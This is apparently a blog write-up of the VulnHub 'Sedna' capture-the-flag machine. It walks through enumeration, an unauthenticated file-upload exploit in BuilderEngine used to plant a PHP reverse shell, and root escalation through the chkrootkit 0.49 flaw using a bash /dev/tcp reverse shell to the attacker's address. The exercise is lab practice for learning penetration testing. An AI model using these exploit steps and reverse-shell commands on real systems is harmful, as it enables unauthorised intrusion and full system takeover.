---
layout: post
title: PenLog - &quot;Sedna&quot; by VulnHub
categories: [VulnHub, Penlog, Write Up, CTF, OSCP]
---

## Details

**Platform:** [VulnHub](https://www.vulnhub.com/)\
**Difficulty:** Medium\
**Link:** [HACKFEST2016: SEDNA](https://www.vulnhub.com/entry/hackfest2016-sedna,181/)

## Enumeration

Run `netdiscover` to find the IP address of the VM:

```bash
$ netdiscover -i vmnet1
192.168.42.130  00:0c:29:9a:47:01      1      42  VMware, Inc.
```

Run full `nmap` port scan on the discovered target IP:
```bash
$ nmap -vv -Pn -sT -T4 -p- -n 192.168.42.130
```

This results in:

![nmap2](/images/posts/penlog_sedna_by_vulnhub/nmap2.png)

Run `dirbuster` against the target's open http port 80 using the _/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt_ wordlist and
options _Be Recursive_ switched off, and _File extension_ set to _html, php, txt_.

Note **/licence.txt** in the result; navigate to this in the browser and notice the line:

    Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.

Continuing through the `DirBuster` results, note **/finder.html**, which, when navigated to in the browser,
has the title: **elFinder 2.0**.

Searching Google, there is a **BuilderEngine** project on GitHub at [tripflex/builder-engine]() with the
description: _"Open source CMS HTML 5 website builder."_

Taking a chance on this, use `searchsploit` and evaluate results:

```bash
$ searchsploit enginebuilder
...
```

![searchsploit](/images/posts/penlog_sedna_by_vulnhub/searchsploit_enginebuilder.png)

Download the non-Metasploit PoC with EDB-ID [40390](https://www.exploit-db.com/exploits/40390):

```bash
$ searchsploit -m 40390
```

### 40390 Description

40390 reports EngineBuilder v3.5.0 as having a Remote Code Execution vulnerability; reading the PoC, it describes the ability to perform Arbitrary File Upload via unauthenticated, unrestricted access to a bundled jQuery File Upload plugin _/themes/dashboard/assets/plugins/jquery-file-upload_.

With this file upload capability, upload a reverse PHP shell--the website is serving PHP--to establish a low-privilege _user_ shell.

## User Shell

Copy 40390, changing the extension from _.php_ to _.html_:

```bash
$ cp 40390.{php,html}
```

Update the PoC's action string to instead include the target IP address:

```bash
$ diff 40390.html 40390.php
22c22
< <form method="post" action="http://192.168.42.130/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
---
> <form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
27c27
< </html>
---
> </html>
\ No newline at end of file
```

Copy _/usr/share/webshells/php/php-reverse-shell.php_ from Kali's bundled webshells and update the connect back IP address/port to be the attacking IP address/port:

![php-webshell](/images/posts/penlog_sedna_by_vulnhub/php_webshell.png)

Serve the _html_ version of 40390 locally and upload the modified _php-reverse-shell.php_:

![40390-upload](/images/posts/penlog_sedna_by_vulnhub/40390_upload.png)

As noted in the documentation, 40390 advises that the uploaded shell will be accessible via _/files_:

![files-list](/images/posts/penlog_sedna_by_vulnhub/files_list.png)

Start an `nc` lister on the port that was added to the modified _php-reverse-shell.php_:

```bash
$ nc -vnlp 4444
```

Click the _php-reverse-shell.php_ link in the browser and establish a reverse shell connection:

![user-shell](/images/posts/penlog_sedna_by_vulnhub/user_shell.png)
_(Note: "reverse" in the above is a bash alias for `nc -vnlp 4444`.)_

Get the user _flag.txt_:

![user-flag](/images/posts/penlog_sedna_by_vulnhub/user_flag.png)

Lastly, upgrade the shell with a PTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ (Ctrl-Z)
$ stty raw -echo
$ fg
$ export TERM=xterm && reset
```

(After spending an hour looking at some other installed, vulnerable software, and attempting _Dirty Cow_ for this vulnerable _Linux Kernel v3.13.0-32_, I discovered a vector via `cron`.)

Upload and execute custom `cronmon.sh`:

```bash
$ cat cronmon.sh
#!/bin/bash

#IFS=$'\n'

old_process=$(ps -eo command)  # sort by command (-o)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process")
    sleep .2
    old_process=$new_process
done
```

After a while, notice `chkrootkit` in the output, running as **root**:

![chkrootkit-cron-root](/images/posts/penlog_sedna_by_vulnhub/chkrootkit_cron_root.png)

Notice path _/etc/chkrootkit_ on target (non-standard) and version string in _/etc/chkrootkit/README_:

```bash
$ cat /etc/chkrootkit/README
...
 09/30/2009 - Version 0.49  new tests: Mac OS X OSX.RSPlug.A.  Enhanced
                            tests: suspicious sniffer logs, suspicious
                            PHP files, shell history file anomalies.
                            Bug fixes in chkdirs.c, chkproc.c and
                            chkutmp.c.
```

Search for a local privilege escalation with `searchsploit` and download the non-Metasploit PoC **33899**:

![33899-chkrootkit](/images/posts/penlog_sedna_by_vulnhub/33899_chkrootkit.png)
_(Note: "ss" in the above is a bash alias for `searchsploit`.)_

### 33899 Description

33899 reports chkrootkit v0.49 as having a vulnerable function that will execute files specified in a variable due to unquoted variable assignment. The PoC goes on to describe _"Steps to reproduce"_:
- Put an executable file named 'update' in /tmp
- Run chkrootkit (as uid 0)

## Root Shell

Follow the instructions and put the file with a bash reverse shell to attacking machine:

```bash
$ echo "bash -i >& /dev/tcp/192.168.42.129/4445 0>&1" > /tmp/update
$ chmod +x /tmp/update
```

Start `nc` listener on the attacking machine, specifying expected reverse shell port (4445 in this case):

```bash
$ nc -vnlp 4445
```

Wait for `cron` to execute `chkrootkit` as root; reading _/etc/crontab_, the root _/etc/cron.hourly_ will run every **17 min**:

![root-cron-hourly](/images/posts/penlog_sedna_by_vulnhub/root_cron_hourly.png)

After _/tmp/update_ is executed as _root_ via the `cron` call to `chkrootkit`, get the root _flag.txt_ via the established root shell:

![root-shell](/images/posts/penlog_sedna_by_vulnhub/root_shell.png)
